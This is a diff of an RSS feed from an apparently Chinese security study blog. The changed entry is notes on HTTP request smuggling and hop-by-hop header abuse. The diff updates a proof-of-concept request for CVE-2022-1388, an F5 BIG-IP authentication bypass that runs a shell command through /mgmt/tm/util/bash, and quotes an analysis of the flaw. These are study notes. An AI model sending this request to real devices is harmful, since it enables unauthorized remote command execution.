@@ -1,4 +1,5 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 21 May 2022 23:09:24 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>HTTP请求走私攻击&amp;Hop-By-Hop请求头利用学习笔记</title><link>https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/</link><pubDate>Sat, 21 May 2022 23:09:24 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/</guid><description>&lt;p>参考链接见文末，如有错漏还请指正（滑跪&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 24 May 2022 17:42:07 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>常见漏洞点总结和思考</title><link>https://amiaaaz.github.io/2022/05/24/common-vulns-summary/</link><pubDate>Tue, 24 May 2022 17:42:07 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/24/common-vulns-summary/</guid><description>&lt;p>暂无。&lt;/p></description></item><item><title>HTTP请求走私攻击&amp;Hop-By-Hop请求头利用学习笔记</title><link>https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/</link><pubDate>Sat, 21 May 2022 23:09:24 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/</guid><description>&lt;p>参考链接见文末，如有错漏还请指正（滑跪&lt;/p>
+&lt;p>*052822：看了很多师傅对于BigIp cve的分析后发现自己对于Hop By Hop漏洞的了解还是浅尝辄止了，不是一个好习惯，警示自己&lt;/p>
 &lt;hr>
 &lt;h2 id="http请求走私">HTTP请求走私&lt;/h2>
 &lt;h3 id="漏洞成因">漏洞成因&lt;/h3>
@@ -730,18 +731,21 @@ Upgrade
 &lt;p>如上图所示，正常proxy处理会在原始请求的下一跳（转移到代理）中移除hop-by-hop列表中的头，利用这种特性，在&lt;code>Connection&lt;/code>中被添加的头会被移除，有这样几种利用思路：删除XFF头隐藏IP、缓存中毒DoS、SSRF、绕过WAF&lt;/p>
 &lt;p>由删header导致的权限提升漏洞有CVE-2021-32813，&lt;a href="https://github.com/traefik/traefik/pull/8319/commits/cbaf86a93014a969b8accf39301932c17d0d73f9">修复方案&lt;/a>就是BIG-IP同款的set，还有&lt;a href="https://github.com/clastix/capsule-proxy/issues/188">栗子&lt;/a>和&lt;a href="https://github.com/rancher/rancher/security/advisories/GHSA-pvxj-25m6-7vqr">栗子2&lt;/a>&lt;/p>
 &lt;h3 id="cve-2022-1388">CVE-2022-1388&lt;/h3>
-&lt;p>非开源项目无法通过diff新旧代码定位漏洞触发点，唯一的线索只有官方给出的手动修复方案&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/640" alt="图片">&lt;/p>
-&lt;p>这里的if三阶段是针对请求头&lt;code>connection&lt;/code>的判断，并给出对应的set&lt;/p>
-&lt;h3 id="poc">poc&lt;/h3>
 &lt;p>将鉴权用的&lt;code>X-F5-Auth-Token&lt;/code>头放入&lt;code>Connection&lt;/code>中让其在被转发至后端服务器时被删掉，从而绕过鉴权&lt;/p>
-&lt;pre tabindex="0">&lt;code>POST /mgmt/tm/util/bash
-Connection: Keep-alive, X-F5-Auth-Token
-{
-&amp;#34;command&amp;#34;:&amp;#34;run&amp;#34;,
-&amp;#34;utilCmdArgs&amp;#34;:&amp;#34;-c id&amp;#34;
-}
-&lt;/code>&lt;/pre>&lt;hr>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">POST /mgmt/tm/util/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Authorization: Basic YWRtaW46
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">X-F5-Auth-Token: a
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Connection: Keep-alive, X-F5-Auth-Token
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">{
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;#34;command&amp;#34;:&amp;#34;run&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;#34;utilCmdArgs&amp;#34;:&amp;#34;-c id&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">}
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多java代码层的分析详见天河师傅的&lt;a href="https://mp.weixin.qq.com/s/f11GOUAP1JGvz_HFqCgsTw">这篇&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>首先是当X-F5-Auth-Token为空时走入另一条验证流程，而这个流程依赖于我们给header提供的Authorization:字段。因为Authorization字段可控，并且没有复杂的加密处理，从而导致可以轻易绕过鉴权。&lt;/p>
+&lt;/blockquote>
+&lt;hr>
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
@@ -754,6 +758,7 @@ Connection: Keep-alive, X-F5-Auth-Token
 &lt;p>&lt;a href="https://paper.seebug.org/1048/#4-httpcve-2018-8004">cve-2018-8004&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://hg8.sh/posts/misc-ctf/request-smuggling/">不知名题&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q">BIG-IP(CVE-2022-1388)从修复方案分析出exp&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://mp.weixin.qq.com/s/f11GOUAP1JGvz_HFqCgsTw">CVE-2022-1388漏洞分析&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">Abusing HTTP hop-by-hop request headers&lt;/a>&lt;/p>
 &lt;/details></description></item><item><title>DNS域传送漏洞学习</title><link>https://amiaaaz.github.io/2022/05/06/dns-zone-transfer-study-note/</link><pubDate>Fri, 06 May 2022 16:52:58 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/06/dns-zone-transfer-study-note/</guid><description>&lt;p>DNS服务器提供域名解析的基础性服务，可以细分为主服务器、备份服务器、缓存服务器，备份服务器会从主服务器中拷贝数据来更新自己的数据库，而这个同步的过程中就需要用到DNS域传送，一旦配置不当，就可能会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，泄露重要信息&lt;/p>
 &lt;h2 id="漏洞成因">漏洞成因&lt;/h2>
